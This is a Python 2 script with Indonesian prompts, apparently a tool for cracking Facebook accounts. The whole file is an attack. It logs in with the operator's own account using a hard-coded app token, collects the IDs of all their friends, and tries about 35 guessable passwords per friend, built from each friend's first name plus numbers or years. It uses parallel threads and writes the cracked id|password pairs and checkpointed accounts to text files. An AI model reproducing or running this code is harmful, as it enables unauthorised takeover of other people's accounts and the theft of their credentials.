
# Copyright: Wily Extended

import os
import sys
import random
import requests
from getpass import getpass
from multiprocessing.pool import ThreadPool

W = '\033[1;37m' 
N = '\033[0m'
R = '\033[1;37m\033[31m'
B = '\033[1;37m\033[34m' 
G = '\033[1;32m'
O = '\033[33m'
C = '\033[36m'




def fb():
	if os.path.exists("Checkpoint.txt"):
		if os.path.getsize("Checkpoint.txt") !=0:
			cek=raw_input('%s[*]%s File Exists: %sCheckpoint.txt%s\n%s[*]%s Replace? y/n): '%(R,N,B,N,R,N)).lower()
			if cek == "y":
				open("Checkpoint.txt","w").close()
		else:
			open("Checkpoint.txt","w").close()
	else:
		open("Checkpoint.txt","w").close()
	if os.path.exists("Multiresult.txt"):
		if os.path.getsize("Multiresult.txt") !=0:
			cek=raw_input('%s[*]%s File Exists: %sMultiresult.txt%s\n%s[*]%s Replace? y/n): '%(R,N,B,N,R,N)).lower()
			if cek == "y":
				open("Multiresult.txt","w").close()
		else:
			open("Multiresult.txt","w").close()
	else:
		open("Multiresult.txt","w").close()
		
class autoBrute:
	def __init__(self):
		fb()
		self.loop=0
		self.target=[]
		self.found=[]
		self.cp=[]
		self.i="https://mbasic.facebook.com/{}"
		self.a="https://graph.facebook.com/{}"
		self.gen()
		
	def gen(self):
		self.r=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(raw_input("[*] Email/No Hp/Id: "),getpass("[*] Pass: "))).json()
		try:
			self.token=self.r["access_token"]
		except:
			exit("%s[*]%s Gagal ..."%(R,N))
		print("%s[*]%s Mencari Id ..."%(G,N))
		for x in requests.get(self.a.format(
			"me/friends?access_token=%s"%(
				self.token))).json()["data"]:
			self.target.append(x["id"])
		p=ThreadPool(input("Masukan Angka: "))
		p.map(self.k,self.target)
		self.panggil()
		
	def panggil(self):
		if len(self.found) !=0:
			print("\n\n%s[*]%s Hasil: %s"%(G,N,len(
				self.found)))
			for x in self.found:
				print("%s[*]%s %s"%(G,N,x))
			print("\n%s[*]%s Hasil: Multiresult.txt"%(
				G,N))
		if len(self.cp) !=0:
			print("\n\n%s[*]%s Checkpoint: %s"%(G,N,len(
				self.cp)))
			for x in self.cp:
				print("%s[*]%s %s"%(G,N,x))
			print("\n%s[*]%s Hasil: Checkpoint.txt"%(
				G,N))
		if len(self.found) ==0 and len(self.cp) ==0:
			print("\n%s[*]%s Tidak Ada Hasil."%(R,N))
		
	def k(self,target):
		try:
			self.user=requests.get(self.a.format(
				target+"?access_token=%s"%(
			self.token))).json()["first_name"]
			for x in [self.user+"123",self.user+"12345",self.user+"123456789",self.user+"1996",self.user+"1997",self.user+"1998",self.user+"1995",self.user+"321",self.user+"54321",self.user+"01",self.user+"02",self.user+"03",self.user+"04",self.user+"05",self.user+"06",self.user+"07",self.user+"08",self.user+"09",self.user+"2019",self.user+"2018",self.user+"2017",self.user+"2016",self.user+"2015",self.user+"2014",self.user+"2013",self.user+"2012",self.user+"2011",self.user+"2010",self.user+"1999",self.user+"2000",self.user+"1994",self.user+"1993",self.user+"1992",self.user+"1991",self.user+"1990",]:
				r=requests.post(self.i.format("login"),
					data=
						{
							"email":target,
							"pass":x
						}
				).url
				if "save-device" in r or "m_sess" in r:
					open("Multiresult.txt","a").write(
						"%s|%s\n"%(target,x))
					self.found.append("%s|%s"%(target,x))
					break
				if "Checkpoint" in r or "challange" in r:
					self.cp.append("%s|%s"%(target,x))
					open("Checkpoint.txt","a").write(
						"%s|%s\n"%(target,x))
					break
			self.loop+=1
			print("\r[%s] Cracking %s/%s Hasil-:%s%s%s    "%(
				len(self.cp),self.loop,len(self.target),
					G,len(self.found),N)),;sys.stdout.flush()
		except:pass
				
autoBrute()
